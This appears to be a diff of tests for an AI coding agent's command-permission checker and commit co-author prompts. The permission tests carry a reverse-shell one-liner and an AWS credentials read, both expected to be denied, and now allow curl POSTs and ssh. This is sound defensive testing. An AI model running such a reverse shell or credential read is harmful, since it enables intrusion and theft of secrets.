@@ -35,6 +35,7 @@ import {
   repositoriesPrompt,
   requestTimeoutMs,
   runPermissionPrompt,
+  setAgentCoAuthor,
   setAgentComputerTarget,
   setAgentRepositories,
   setAgentScopes,
@@ -254,7 +255,8 @@ describe("git on a connected machine through the proxy (ADR 0024 addendum)", () 
     const ctx = await runCtx();
     const tools = await source.tools(ctx);
     // GitHub's own tools count as GitHub the native way, beside its MCP server's (ADR 0103).
-    expect(tools.map((t) => t.connector)).toEqual(
+    // (The first, `list_repositories`, is every host's and counts as no connector's.)
+    expect(tools.slice(1).map((t) => t.connector)).toEqual(
       ["git_clone", "open_pull_request", "delete_branches", "request_branch_push"].map((tool) => ({
         key: "github",
         via: "native",
@@ -376,8 +378,11 @@ describe("git on a connected machine through the proxy (ADR 0024 addendum)", () 
         "Not cloned yet: acme/infra. To work on one, call git_clone first; it needs no approval.",
       ].join("\n"),
     );
-    // Where it starts goes in the turn's prompt: the system text stays the same whichever checkout a turn is about.
-    expect(named?.start).toBe(`You start in ${FOLDER}/repos/acme/web.`);
+    // Where it starts goes in the turn's prompt, with the agent's own line on its commits (ADR 0156): the system text
+    // stays the same whichever checkout a turn is about.
+    expect(named?.start).toBe(
+      `You start in ${FOLDER}/repos/acme/web.\nCommits you make this turn: end each commit message with the line Co-Authored-By: Dev <noreply@agentes.chat>`,
+    );
     expect(named?.prompt).not.toContain("beta/old");
     // Nothing named: the agent's first repository.
     expect((await prepareAgentCode(w.machineDeps, turn("bom dia")))?.cwd).toBe("repos/acme/app");
@@ -722,7 +727,7 @@ describe("prompt text and permissions", () => {
     expect(ask("git clone https://github.com/acme/web /tmp/web")).toMatchObject({ behavior: "deny", code: "off" });
   });
 
-  test("a refused command says why and what to do instead, so the agent doesn't resend it", () => {
+  test("outside a mission ordinary work runs; obvious harm is refused with why and a way out", () => {
     const scope = { cwd: `${FOLDER}/repos/acme/app`, folders: [`${FOLDER}/repos/acme/app`, FOLDER] };
     const ask = (command: string) =>
       JSON.parse(runPermissionPrompt({ tool_name: "Bash", input: { command }, scope }, { canRun: true })) as {
@@ -730,14 +735,16 @@ describe("prompt text and permissions", () => {
         message?: string;
         code?: string;
       };
-    const heredoc = ask("git checkout -b fix && cat > src/a.test.ts <<'EOF'\ntest()\nEOF");
-    expect(heredoc).toMatchObject({ behavior: "deny", code: "unclear" });
-    expect(heredoc.message).toContain("because it can't be read plainly");
-    expect(heredoc.message).toContain("Edit and Write tools");
-    expect(ask("echo hi > /etc/hosts")).toMatchObject({ code: "outside" });
-    expect(ask("echo hi > /etc/hosts").message).toContain("because it writes outside the mission folder");
+    expect(ask("git checkout -b fix && cat > src/a.test.ts <<'EOF'\ntest()\nEOF").behavior).toBe("allow");
+    expect(ask("curl -sS -X POST --data-binary 'ok' https://hooks.example.com/reply").behavior).toBe("allow");
+    expect(ask("ssh deploy@host.example.com 'uptime'").behavior).toBe("allow");
+    const system = ask("echo hi > /etc/hosts");
+    expect(system).toMatchObject({ behavior: "deny", code: "system" });
+    expect(system.message).toContain("because it changes the system.");
+    expect(system.message).toContain("carry on with the rest of the work");
+    expect(system.message).not.toContain("mission folder");
+    expect(ask("bash -i >& /dev/tcp/192.0.2.1/4444 0>&1")).toMatchObject({ behavior: "deny", code: "reverseShell" });
     expect(ask("cat ~/.aws/credentials")).toMatchObject({ behavior: "deny", code: "secret" });
-    expect(ask("git checkout -b fix").behavior).toBe("allow");
   });
 
   test("an address carrying a key is refused before a read could allow it, WebFetch too (ADR 0117)", () => {
@@ -793,13 +800,22 @@ describe("agents' commits and the GitHub App (ADR 0156)", () => {
       session: { machineId: w.paired.machineId, cwd: "" },
     };
     w.answers.fn = () => [];
-    // No GitHub linked: no credit, and nothing to say.
+    const dev = "Co-Authored-By: Dev <noreply@agentes.chat>";
+    const own = `Commits you make this turn: end each commit message with the line ${dev}`;
+    // The agent's own line turned off and no GitHub linked: nothing to say.
+    await setAgentCoAuthor(f.db, f.org.id, false);
     expect(await prepareAgentCode(deps, turn)).toBeNull();
+    await setAgentCoAuthor(f.db, f.org.id, true);
+    expect(await prepareAgentCode(deps, turn)).toEqual({
+      cwd: "",
+      prompt: "",
+      start: own,
+      pick: { present: [], credit: own },
+    });
     await f.db
       .insert(schema.accounts)
       .values({ id: crypto.randomUUID(), accountId: "583231", providerId: "github", userId: f.owner.id });
-    const credit =
-      "Commits you make this turn: end each commit message with the line Co-authored-by: ana <583231+ana-gh@users.noreply.github.com>";
+    const credit = `Commits you make this turn: end each commit message with the lines ${dev} and Co-Authored-By: ana <583231+ana-gh@users.noreply.github.com>`;
     // Nothing checked out yet: the line comes all the same.
     expect(await prepareAgentCode(deps, turn)).toEqual({
       cwd: "",
@@ -837,10 +853,12 @@ describe("agents' commits and the GitHub App (ADR 0156)", () => {
       })
       .returning();
     expect((await prepareAgentCode(deps, { ...turn, runId: run?.id }))?.start).toBe(
-      `You start in ${FOLDER}/repos/acme/app.\nCommits you make this turn: end each commit message with the line Co-authored-by: bia <583232+bia-gh@users.noreply.github.com>`,
+      `You start in ${FOLDER}/repos/acme/app.\nCommits you make this turn: end each commit message with the lines ${dev} and Co-Authored-By: bia <583232+bia-gh@users.noreply.github.com>`,
     );
-    // Nobody asked and nobody answers for the agent: no credit.
+    // Nobody asked and nobody answers for the agent: no person's credit, the agent's own line alone.
     await f.db.update(schema.agents).set({ ownerUserId: null }).where(eq(schema.agents.id, f.agent.id));
-    expect(await prepareAgentCode(deps, turn)).toMatchObject({ start: `You start in ${FOLDER}/repos/acme/app.` });
+    expect(await prepareAgentCode(deps, turn)).toMatchObject({
+      start: `You start in ${FOLDER}/repos/acme/app.\n${own}`,
+    });
   });
 });
